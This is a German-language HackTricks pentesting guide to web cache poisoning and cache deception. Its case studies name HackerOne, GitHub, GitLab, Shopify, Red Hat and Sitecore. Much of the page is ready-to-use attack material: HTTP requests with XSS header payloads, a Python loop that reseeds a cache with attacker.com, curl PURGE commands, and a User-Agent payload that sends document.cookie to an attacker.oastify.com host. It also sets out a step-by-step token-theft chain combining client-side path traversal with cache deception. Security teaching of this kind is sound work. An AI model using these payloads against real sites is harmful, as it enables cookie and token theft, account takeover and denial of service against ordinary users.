# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## Der Unterschied

> **Was ist der Unterschied zwischen web cache poisoning und web cache deception?**
>
> - Bei **web cache poisoning** veranlasst der Angreifer, dass die Anwendung bösartigen Inhalt im Cache speichert, und dieser Inhalt wird anderen Anwendungsbenutzern aus dem Cache serviert.
> - Bei **web cache deception** veranlasst der Angreifer, dass die Anwendung sensible Inhalte eines anderen Benutzers im Cache speichert, und der Angreifer ruft diesen Inhalt dann aus dem Cache ab.

## Cache Poisoning

Cache poisoning zielt darauf ab, den Client-seitigen Cache zu manipulieren, um Clients dazu zu bringen, Ressourcen zu laden, die unerwartet, unvollständig oder unter der Kontrolle eines Angreifers sind. Das Ausmaß der Auswirkungen hängt von der Beliebtheit der betroffenen Seite ab, da die verseuchte Antwort ausschließlich Nutzern serviert wird, die die Seite während der Dauer der Cache-Kontamination besuchen.

Die Durchführung eines cache poisoning-Angriffs umfasst mehrere Schritte:

1. **Identification of Unkeyed Inputs**: Dies sind Parameter, die zwar nicht erforderlich sind, damit eine Anfrage gecached wird, aber die die vom Server zurückgegebene Antwort verändern können. Das Identifizieren dieser Inputs ist entscheidend, da sie ausgenutzt werden können, um den Cache zu manipulieren.
2. **Exploitation of the Unkeyed Inputs**: Nachdem die Unkeyed Inputs identifiziert wurden, besteht der nächste Schritt darin herauszufinden, wie diese Parameter missbraucht werden können, um die Serverantwort zu ändern, sodass es dem Angreifer nützt.
3. **Ensuring the Poisoned Response is Cached**: Der letzte Schritt besteht darin sicherzustellen, dass die manipulierte Antwort im Cache gespeichert wird. Auf diese Weise erhält jeder Benutzer, der während der Dauer der Cache-Verseuchung auf die betroffene Seite zugreift, die verfälschte Antwort.

### Discovery: Check HTTP headers

In der Regel gibt es, wenn eine Antwort **im Cache gespeichert wurde**, einen **entsprechenden Header**, Sie können nachsehen, auf welche Header Sie in diesem Beitrag achten sollten: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Discovery: Caching error codes

Wenn Sie vermuten, dass die Antwort in einem Cache gespeichert wird, können Sie versuchen, **Anfragen mit einem fehlerhaften Header zu senden**, die eigentlich mit einem **Statuscode 400** beantwortet werden sollten. Versuchen Sie anschließend, die Anfrage normal aufzurufen — wenn die **Antwort ein 400-Statuscode** ist, wissen Sie, dass sie verwundbar ist (und Sie könnten sogar einen DoS durchführen).

You can find more options in:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Beachten Sie jedoch, dass **manchmal diese Arten von Statuscodes nicht gecached werden**, sodass dieser Test nicht zuverlässig sein könnte.

### Discovery: Identify and evaluate unkeyed inputs

Sie können [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) verwenden, um **Parameter und Header per Brute-Force** auszuprobieren, die möglicherweise **die Antwort der Seite verändern**. Zum Beispiel könnte eine Seite den Header `X-Forwarded-For` verwenden, um dem Client anzuzeigen, das Script von dort zu laden:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Einen schädlichen Response vom Back-End-Server auslösen

Wenn der Parameter/Header identifiziert ist, prüfe, wie er **bereinigt** wird und **wo** er in der Antwort aus dem Header **reflektiert** wird oder die Antwort beeinflusst. Kannst du ihn trotzdem missbrauchen (XSS ausführen oder ein von dir kontrolliertes JS laden? DoS durchführen?...)

### Die Antwort cachen

Sobald du die **Seite** identifiziert hast, die missbraucht werden kann, sowie den **Parameter**/**Header**, den du verwenden willst und **wie** du ihn **missbrauchen** kannst, musst du die Seite cachen lassen. Je nach Ressource kann das einige Zeit dauern — du musst möglicherweise mehrere Sekunden versuchen.

Der Header **`X-Cache`** in der Antwort kann sehr nützlich sein, da er den Wert **`miss`** haben kann, wenn die Anfrage nicht gecached wurde, und den Wert **`hit`** wenn sie gecached ist.\
Der Header **`Cache-Control`** ist ebenfalls nützlich, um zu wissen, ob eine Ressource gecached wird und wann sie erneut gecached wird: `Cache-Control: public, max-age=1800`

Ein weiterer interessanter Header ist **`Vary`**. Dieser Header wird häufig verwendet, um **zusätzliche Header anzugeben**, die als **Teil des Cache-Schlüssels** behandelt werden, selbst wenn sie normalerweise nicht zur Schlüsselbildung gehören. Daher kann ein Angreifer, der den `User-Agent` des Ziels kennt, den Cache für Nutzer mit genau diesem `User-Agent` vergiften.

Ein weiterer zum Cache gehörender Header ist **`Age`**. Er definiert die Zeit in Sekunden, die das Objekt im Proxy-Cache verbracht hat.

Beim Cachen einer Anfrage sei **vorsichtig mit den Headern, die du verwendest**, da einige unerwartet als **Teil des Schlüssels** behandelt werden könnten und das **Opfer denselben Header** benutzen muss. Teste eine Cache Poisoning immer mit **verschiedenen Browsern**, um zu prüfen, ob es funktioniert.

### Foundational cache poisoning case studies

#### HackerOne global redirect via `X-Forwarded-Host`

- Der Origin generierte Weiterleitungen und kanonische URLs mit `X-Forwarded-Host`, aber der Cache-Schlüssel verwendete nur den `Host`-Header, sodass eine einzelne Response jeden Besucher von `/` vergiftete.
- Poison with:
```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```
- Fordere sofort `/` erneut an ohne den spoofed header; wenn die Weiterleitung bestehen bleibt, hast du eine globale host-spoofing primitive, die reflected redirects/Open Graph links häufig in gespeicherte Issues überführt.

#### GitHub repository DoS via `Content-Type` + `PURGE`

- Anonymer Traffic wurde nur anhand des Pfads unterschieden, während das Backend in einen Fehlerzustand geriet, als es einen unerwarteten `Content-Type` sah. Diese Fehlerantwort war für jeden nicht authentifizierten Nutzer eines repo cacheable.
- GitHub hat außerdem (versehentlich) das `PURGE`-Verb geachtet, wodurch ein Angreifer einen gesunden Eintrag leeren und Caches zwingen konnte, die vergiftete Variante auf Abruf zu ziehen:
```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
curl -X PURGE https://github.com/user/repo
```
- Vergleiche immer authenticated vs anonymous cache keys, fuzz selten keyed headers wie `Content-Type`, und prüfe auf exponierte cache-maintenance verbs, um re-poisoning zu automatisieren.

#### Shopify cross-host persistence loops

- Mehrschichtige Caches erfordern manchmal mehrere identische Hits, bevor ein neues Objekt committed wird. Shopify hat denselben Cache über zahlreiche lokalisierte Hosts wiederverwendet, sodass Persistenz Auswirkungen auf viele Properties hatte.
- Verwende kurze Automatisierungsschleifen, um wiederholt reseed auszuführen:
```python
import requests, time
for i in range(100):
requests.get("https://shop.shopify.com/endpoint",
headers={"X-Forwarded-Host": "attacker.com"})
time.sleep(0.1)
print("attacker.com" in requests.get("https://shop.shopify.com/endpoint").text)
```
- Nach einer `hit`-Antwort andere Hosts/Assets durchsuchen, die denselben Cache-Namespace teilen, um die cross-domain blast radius zu demonstrieren.

#### JS asset redirect → stored XSS chain

- Private Programme hosten oft geteiltes JS wie `/assets/main.js` auf Dutzenden von Subdomains. Wenn `X-Forwarded-Host` die Redirect-Logik für diese Assets beeinflusst, aber nicht in den Cache-Key einbezogen wird, wird die gecachte Antwort zu einem 301 auf Angreifer-JS, was überall dort stored XSS zur Folge hat, wo das Asset importiert wird.
```http
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
- Kartiere, welche Hosts denselben Asset-Pfad wiederverwenden, damit du eine Kompromittierung mehrerer Subdomains nachweisen kannst.

#### GitLab statischer DoS durch `X-HTTP-Method-Override`

- GitLab lieferte statische Bundles von Google Cloud Storage aus, das `X-HTTP-Method-Override` respektiert. Das Überschreiben von GET zu HEAD lieferte ein cachefähiges `200 OK` mit `Content-Length: 0`, und der edge cache ignorierte die HTTP-Methode bei der Generierung des Keys.
```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```
- Eine einzelne Anfrage ersetzte das JS-Bundle durch einen leeren Body für jeden GET, effectively DoSing the UI. Teste immer Method-Overrides (`X-HTTP-Method-Override`, `X-Method-Override`, etc.) gegen statische Assets und bestätige, ob der Cache je nach Methode variiert.

#### HackerOne statischer Asset-Loop über `X-Forwarded-Scheme`

- Rails’ Rack-Middleware vertraute `X-Forwarded-Scheme`, um zu entscheiden, ob HTTPS erzwungen werden soll. Das Spoofing von `http` gegen `/static/logo.png` löste einen cachebaren 301 aus, sodass alle Nutzer anschließend Redirects (oder Loops) statt des Assets erhielten:
```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```
- Kombiniere scheme spoofing mit host spoofing, wenn möglich, um irreversible redirects für stark sichtbare Ressourcen zu erstellen.

#### Cloudflare host-header casing mismatch

- Cloudflare normalisierte den `Host` header für cache keys, leitete aber die rohe Groß-/Kleinschreibung an origins weiter. Das Senden von `Host: TaRgEt.CoM` löste alternatives Verhalten in origin routing/templating aus, während gleichzeitig der kanonische lowercase cache bucket befüllt wurde.
```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```
- Enumeriere CDN-Tenants, indem du mixed-case Hosts (und andere normalisierte Headers) wieder abspielst und die cached response mit der origin response vergleichst, um shared-platform cache poisonings aufzudecken.

#### Red Hat Open Graph meta poisoning

- Das Injizieren von `X-Forwarded-Host` innerhalb von Open Graph-Tags verwandelte eine reflected HTML injection in einen stored XSS, sobald das CDN die Seite gecached hatte. Verwende während des Testens einen harmless cache buster, um Produktionsnutzer nicht zu gefährden:
```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```
- Social media scrapers konsumieren zwischengespeicherte Open Graph tags, sodass ein einzelner vergifteter Eintrag die payload weit über direkte Besucher hinaus verteilt.

## Beispiele für Exploits

### Einfachstes Beispiel

Ein Header wie `X-Forwarded-For` wird in der Antwort ungefiltert reflektiert.\
Du kannst eine einfache XSS payload senden und den Cache vergiften, sodass jeder, der die Seite aufruft, XSSed wird:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Beachte, dass dies eine Anfrage an `/en?region=uk` poisonen wird, nicht an `/en`_

### Cache poisoning für DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning durch CDNs

In **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** wird folgendes einfaches Szenario erklärt:

- The CDN wird alles unter `/share/` cachen
- The CDN wird `%2F..%2F` NICHT dekodieren noch normalisieren, daher kann es als **path traversal to access other sensitive locations that will be cached** verwendet werden, wie `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Der Webserver WIRD `%2F..%2F` dekodieren und normalisieren und antwortet mit `/api/auth/session`, welches **contains the auth token**.

### Einsatz von web cache poisoning zum Ausnutzen von Cookie-Handling-Schwachstellen

Cookies können auch in der Antwort einer Seite reflektiert werden. Wenn du das ausnutzen kannst, um zum Beispiel eine XSS zu verursachen, könntest du in der Lage sein, XSS in mehreren Clients auszunutzen, die die bösartige Cache-Antwort laden.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Beachte, dass wenn das verwundbare Cookie sehr häufig von den Nutzern verwendet wird, normale Requests den Cache regelmäßig leeren.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Siehe:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) wie es möglich war, einen OpenAI API key mit einer URL wie `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` zu stehlen, weil alles, was auf `/share/*` passt, gecached wird, ohne dass Cloudflare die URL normalisiert, was erst passiert, als die Anfrage den Webserver erreicht hat.

Das wird auch besser erklärt in:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Manchmal musst du **exploit several unkeyed inputs**, um einen Cache ausnutzen zu können. Zum Beispiel kannst du einen **Open redirect** finden, wenn du `X-Forwarded-Host` auf eine von dir kontrollierte Domain und `X-Forwarded-Scheme` auf `http` setzt. **If** the **server** is **forwarding** all the **HTTP** requests **to HTTPS** and using the header `X-Forwarded-Scheme` as the domain name for the redirect, kannst du steuern, wohin die Seite durch die Weiterleitung zeigt.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Ausnutzen bei eingeschränktem `Vary`header

Wenn du festgestellt hast, dass der **`X-Host`**-Header als **Domainname zum Laden einer JS-Ressource** verwendet wird, der **`Vary`**-Header in der Antwort jedoch **`User-Agent`** angibt, musst du einen Weg finden, den User-Agent des Opfers zu exfiltrate und mit diesem User-Agent den Cache zu poison the cache:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Sende eine GET request mit der request sowohl in der URL als auch im body. Wenn der web server die aus dem body verwendet, aber der cache server die aus der URL cached, wird jeder, der diese URL aufruft, tatsächlich den parameter aus dem body verwenden. Wie die vuln, die James Kettle auf der Github-Website gefunden hat:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

For example it's possible to separate **parameters** in ruby servers using the char **`;`** instead of **`&`**. This could be used to put unkeyed parameters values inside keyed ones and abuse them.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Erfahre hier, wie man [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning) durchführt.

### Automated testing for Web Cache Poisoning

Der [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) kann verwendet werden, um Web Cache Poisoning automatisiert zu testen. Er unterstützt viele verschiedene Techniken und ist hoch konfigurierbar.

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Dieses reale Muster verknüpft ein header-basiertes Reflection-Primitive mit dem Verhalten von CDN/WAFs, um zuverlässig das gecachte HTML zu vergiften, das anderen Nutzern ausgeliefert wird:

- Das Haupt-HTML reflektierte einen untrusted request header (z. B. `User-Agent`) in einen ausführbaren Kontext.
- Das CDN entfernte Cache-Header, aber es existierte ein interner/origin Cache. Das CDN cached außerdem automatisch Requests, die auf statische Endungen enden (z. B. `.js`), während der WAF bei GETs für statische Assets eine schwächere Inhalt-Inspektion anwandte.
- Request-Flow-Quirks erlaubten, dass ein Request auf einen `.js`-Pfad den Cache-Key/Variant beeinflusste, der für das anschließende Haupt-HTML verwendet wurde, wodurch Cross-User XSS via Header-Reflection möglich wurde.

Praktische Vorgehensweise (beobachtet bei einem beliebten CDN/WAF):

1) Von einer sauberen IP starten (vorherige reputationsbasierte Downgrades vermeiden) und einen bösartigen `User-Agent` über den Browser oder Burp Proxy Match & Replace setzen.  
2) Im Burp Repeater eine Gruppe von zwei Requests vorbereiten und "Send group in parallel" verwenden (der Single-Packet-Modus funktioniert am besten):
- Erster Request: GET auf eine `.js`-Ressource auf derselben Origin, während du deinen bösartigen `User-Agent` sendest.
- Direkt danach: GET der Hauptseite (`/`).
3) Das CDN/WAF-Routing-Rennen plus das auto-gecachte `.js` seedet oft eine vergiftete gecachte HTML-Variante, die dann anderen Besuchern serviert wird, die dieselben Cache-Key-Bedingungen teilen (z. B. dieselben `Vary`-Dimensionen wie `User-Agent`).

Example header payload (to exfiltrate non-HttpOnly cookies):
```http
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Betriebliche Hinweise:

- Viele CDNs verbergen Cache-Header; Poisoning kann sich möglicherweise erst in mehrstündigen Refresh-Zyklen zeigen. Verwende mehrere vantage IPs und drossle Requests, um Rate-Limit- oder Reputation-Trigger zu vermeiden.
- Die Verwendung einer IP aus der Cloud des CDN verbessert manchmal die Routing-Konsistenz.
- Wenn eine strikte CSP vorhanden ist, funktioniert dies dennoch, wenn die Reflektion im Haupt-HTML-Kontext ausgeführt wird und CSP inline-Ausführung erlaubt oder durch den Kontext umgangen wird.

Auswirkung:

- Wenn session cookies nicht `HttpOnly` sind, ist ein zero-click ATO möglich, indem `document.cookie` massenhaft von allen Nutzern exfiltriert wird, die das poisoned HTML erhalten.


### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

Ein Sitecore‑spezifisches Muster ermöglicht unauthentifizierte Schreibzugriffe auf den HtmlCache, indem pre‑auth XAML-Handler und AjaxScriptManager-Reflection missbraucht werden. Wenn der `Sitecore.Shell.Xaml.WebControl`-Handler erreicht wird, steht ein `xmlcontrol:GlobalHeader` (abgeleitet von `Sitecore.Web.UI.WebControl`) zur Verfügung und folgender reflektiver Aufruf ist erlaubt:
```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
This writes arbitrary HTML under an attacker‑chosen cache key, enabling precise poisoning once cache keys are known.

Für vollständige Details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Verwundbare Beispiele

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS leitete das Fragment im URL weiter, ohne es zu entfernen, und erzeugte den cache key nur anhand von host, path und query (ignorierte das Fragment). So wurde die Anfrage `/#/../?r=javascript:alert(1)` an das Backend als `/#/../?r=javascript:alert(1)` gesendet und der cache key enthielt die payload nicht, sondern nur host, path und query.

### 403 und Storage Buckets

Cloudflare cached früher 403-Antworten. Der Versuch, auf S3 oder Azure Storage Blobs mit falschen Authorization-Headern zuzugreifen, führte zu einer 403-Antwort, die gecached wurde. Obwohl Cloudflare aufgehört hat, 403-Antworten zu cachen, kann dieses Verhalten bei anderen Proxy-Services weiterhin vorhanden sein.

### Injecting Keyed Parameters

Caches schließen oft bestimmte GET-Parameter in den cache key ein. Zum Beispiel cached Fastly's Varnish den `size`-Parameter in Requests. Wenn jedoch eine URL-encoded Version des Parameters (z. B. `siz%65`) mit einem fehlerhaften Wert gesendet wurde, wurde der cache key mit dem korrekten `size`-Parameter konstruiert. Das Backend verarbeitete jedoch den Wert im URL-encoded Parameter. Das URL-encoding des zweiten `size`-Parameters führte dazu, dass er vom cache weggelassen, aber vom backend genutzt wurde. Wenn diesem Parameter der Wert 0 zugewiesen wurde, resultierte das in einem cacheable 400 Bad Request.

### User Agent Rules

Einige Entwickler blockieren Requests mit user-agents, die denen von stark frequentierten Tools wie FFUF oder Nuclei entsprechen, um Server-Load zu reduzieren. Ironischerweise kann dieser Ansatz Schwachstellen wie cache poisoning und DoS einführen.

### Illegal Header Fields

Die [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) legt die zulässigen Zeichen in Header-Namen fest. Header, die Zeichen außerhalb des spezifizierten **tchar**-Bereichs enthalten, sollten idealerweise eine 400 Bad Request-Antwort auslösen. In der Praxis halten sich Server nicht immer an diesen Standard. Ein bemerkenswertes Beispiel ist Akamai, das Header mit ungültigen Zeichen weiterleitet und jede 400-Fehlerseite cached, solange der `cache-control`-Header nicht vorhanden ist. Ein ausnutzbares Muster wurde identifiziert, bei dem das Senden eines Headers mit einem illegalen Zeichen, z. B. `\`, zu einer cacheable 400 Bad Request führte.

### Neue Header finden

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

Beachte zunächst, dass **extensions** wie `.css`, `.js`, `.png` usw. üblicherweise so **konfiguriert** sind, dass sie im **cache** **gespeichert** werden. Wenn du also `www.example.com/profile.php/nonexistent.js` aufrufst, wird der cache wahrscheinlich die Antwort speichern, weil er die `.js` **extension** erkennt. Wenn jedoch die **application** mit den **sensiblen** Benutzerinhalten aus _www.example.com/profile.php_ antwortet, kannst du diese Inhalte von anderen Benutzern **stehlen**.

Weitere Dinge zum Testen:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
In dem Write-up wird erklärt, dass wenn du eine nicht existente Seite wie _http://www.example.com/home.php/non-existent.css_ lädst, der Inhalt von _http://www.example.com/home.php_ (**mit den sensiblen Informationen des Users**) zurückgegeben wird und der cache-Server das Ergebnis speichert.\
Dann kann der **attacker** _http://www.example.com/home.php/non-existent.css_ in seinem eigenen Browser aufrufen und die **vertraulichen Informationen** der zuvor zugreifenden Benutzer einsehen.

Beachte, dass der **cache proxy** so **konfiguriert** sein sollte, dass er Dateien **basierend** auf der **extension** der Datei (_.css_) cached und nicht basierend auf dem content-type. Im Beispiel wird _http://www.example.com/home.php/non-existent.css_ einen `text/html` content-type anstelle eines `text/css` mime type haben.

Erfahre hier, wie man perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

### CSPT-assisted authenticated cache poisoning (Account Takeover)

Dieses Muster kombiniert ein Client-Side Path Traversal (CSPT)-Primitive in einer Single-Page App (SPA) mit extension-basierendem CDN-Caching, um sensitives JSON öffentlich zu cachen, das ursprünglich nur über einen authentifizierten API-Aufruf verfügbar war.

Kernidee:

- Ein sensitiver API-Endpunkt erfordert einen custom auth header und ist am Origin korrekt als non-cacheable markiert.
- Das Anhängen eines statisch wirkenden Suffixes (z. B. .css) lässt das CDN den Pfad als statisches Asset behandeln und die Antwort cachen, oft ohne die sensiblen Header zu berücksichtigen.
- Die SPA enthält CSPT: Sie hängt ein vom Benutzer kontrolliertes Pfadsegment an die API-URL an und sendet dabei den auth header des Opfers (z. B. X-Auth-Token). Durch das Injizieren von ../.. Traversal wird das authentifizierte Fetch auf die cacheable Pfadvariante (…/v1/token.css) umgeleitet, wodurch das CDN das Token-JSON des Opfers unter einem public key cached.
- Danach kann jeder denselben cache key per GET ohne Authentifizierung abrufen und das Token des Opfers erhalten.

Beispiel

- Sensitiver Endpoint (non-cacheable at origin):
```
GET /v1/token HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Cache: Miss from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- Ein statisch wirkender Suffix bringt das CDN dazu, die Ressource als cacheable zu behandeln:
```
GET /v1/token.css HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=86400, public
X-Cache: Hit from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- CSPT in SPA hängt auth header an und erlaubt traversal:
```js
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('userId');

const apiUrl = `https://api.example.com/v1/users/info/${userId}`;

fetch(apiUrl, {
method: 'GET',
headers: { 'X-Auth-Token': authToken }
});
```
- Exploit-Kette:
1. Locke das Opfer auf eine URL, die Dot-Segmente in den SPA-Pfad-Parameter injiziert, z.B.:
- [https://example.com/user?userId=../../../v1/token.css](https://example.com/user?userId=../../../v1/token.css)
2. Die SPA führt einen authentifizierten fetch zu:
- [https://api.example.com/v1/users/info/../../../v1/token.css](https://api.example.com/v1/users/info/../../../v1/token.css)
3. Die Browser-Normalisierung löst das auf:
- [https://api.example.com/v1/token.css](https://api.example.com/v1/token.css)
4. Das CDN behandelt .css als statisches Asset und speichert das JSON im Cache mit Cache-Control: public, max-age=...
5. Öffentliche Abfrage: jeder kann dann GET https://api.example.com/v1/token.css durchführen und das gecachte token JSON erhalten.

Voraussetzungen

- Die SPA führt authentifizierte fetch/XHR-Anfragen an denselben API-Origin aus (oder cross-origin mit funktionierendem CORS) und hängt sensitive Header oder Bearer-Tokens an.
- Edge/CDN wendet extension-basiertes Caching für statisch wirkende Pfade an (z. B. *.css, *.js, images) und variiert den Cache-Key nicht anhand des sensitiven Headers.
- Der Origin für den Basis-Endpunkt ist nicht-cacheable (korrekt), aber die Variante mit Erweiterungs-Suffix ist erlaubt oder wird nicht durch Edge-Regeln blockiert.

Validierungs-Checkliste

- Identifiziere sensitive dynamische Endpunkte und probiere Suffixe wie .css, .js, .jpg, .json. Achte auf Cache-Control: public/max-age und X-Cache: Hit (oder Äquivalent, z. B. CF-Cache-Status), während der Inhalt weiterhin JSON ist.
- Finde Client-Code, der benutzerkontrollierte Eingabe in API-Pfade concatenatet/zusammenhängt und dabei Auth-Header anhängt. Injiziere ../-Sequenzen, um die authentifizierte Anfrage auf dein Ziel-Endpoint umzuleiten.
- Bestätige, dass der authentifizierte Header in der umgeleiteten Anfrage vorhanden ist (z. B. in einem Proxy oder via serverseitigen Logs) und dass das CDN die Antwort unter dem traversierten Pfad cached.
- Fordere aus einem frischen Kontext (kein Auth) denselben Pfad an und bestätige, dass das geheime JSON aus dem Cache ausgeliefert wird.

## Automatische Tools

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner to find web cache poisoning vulnerabilities in a list of URLs and test multiple injection techniques.

## References

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [CSPT presentation by Maxence Schmitt](https://www.youtube.com/watch?v=O1ZN_OCfNzg)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Cache Poisoning Case Studies Part 1: Foundational Attacks Behind a $100K+ Vulnerability Class](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)



{{#include ../../banners/hacktricks-training.md}}
